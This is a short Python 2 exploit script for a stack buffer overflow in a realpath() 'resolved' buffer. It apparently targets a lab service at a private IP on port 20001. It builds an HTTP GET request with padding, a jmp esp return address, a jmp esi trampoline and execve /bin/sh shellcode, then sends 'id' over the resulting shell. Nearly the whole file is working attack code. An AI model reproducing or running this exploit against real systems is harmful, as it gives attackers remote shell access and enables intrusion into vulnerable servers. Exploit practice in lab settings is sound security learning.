#!/usr/bin/env python
# 
# Buffer overflow on "resolved" through realpath()
# what we have:
# [ X * 139 ] [ saved EIP ]
# what we will write:
# [ X * 139 ] [ &jmp_esp] [ "BB" + jump_esi ] 
# where esi = &shellcode
# BB is here as alignement instruction, could be nops too.
  
import time
import socket

IP = "192.168.122.37"
PORT = 20001
jmp_esp_addr = "\x4f\x9f\x04\x08"
jump_esi_inst = "\xff\xe6"
pre_payload = "GET " + "X"*139 + jmp_esp_addr + "BB" + jump_esi_inst +  " HTTP/1.1"
nop =  "\x90" * 10
shellcode =  nop + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
cmd = "id"

payload = pre_payload + shellcode

s = socket.create_connection((IP, PORT))
print ">>", payload
s.send(payload)
time.sleep(1)
print ">>", cmd
s.send(cmd + "\n")
print "<<", s.recv(1024)
